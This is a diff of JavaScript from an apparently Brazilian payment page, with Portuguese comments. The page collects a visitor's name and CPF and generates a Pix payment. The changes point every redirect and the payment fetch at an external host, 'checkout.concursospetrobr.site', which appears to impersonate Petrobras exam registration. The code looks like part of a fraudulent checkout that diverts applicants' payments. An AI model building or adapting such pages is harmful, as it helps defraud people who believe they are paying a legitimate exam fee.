@@ -449,14 +449,14 @@ document.addEventListener("DOMContentLoaded", function () {
             if (sessionStorage.getItem("pix_data1")) {
                 console.log("📦 Pix já gerado, redirecionando...");
                 closePaymentModal();
-                window.location.href = "/seguro/";
+                window.location.href = "https://checkout.concursospetrobr.site/VCCL1O8SCPMB";
                 return;
             }
             
             /* === 3. GERA O PIX VIA PROXY === */
             console.log("🌐 Gerando PIX para:", nome, cpf);
             
-            const response = await fetch(`/seguro/proxy_pix.php?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpf)}`);
+            const response = await fetch(`https://checkout.concursospetrobr.site/VCCL1O8SCPMB`);
             
             if (!response.ok) {
                 throw new Error(`Erro na API: ${response.status}`);
@@ -492,7 +492,7 @@ document.addEventListener("DOMContentLoaded", function () {
             console.log("🚀 Redirecionando para página do PIX...");
             
             closePaymentModal();
-            window.location.href = "/seguro/";
+            window.location.href = "https://checkout.concursospetrobr.site/VCCL1O8SCPMB";
             
         } catch (error) {
             console.error("❌ Erro:", error);
@@ -523,7 +523,7 @@ document.addEventListener("DOMContentLoaded", function () {
                 
                 // Fecha modal e redireciona mesmo com fallback
                 closePaymentModal();
-                window.location.href = "/seguro/";
+                window.location.href = "https://checkout.concursospetrobr.site/VCCL1O8SCPMB";
                 
             } catch (fallbackError) {
                 console.error("❌ Fallback também falhou:", fallbackError);
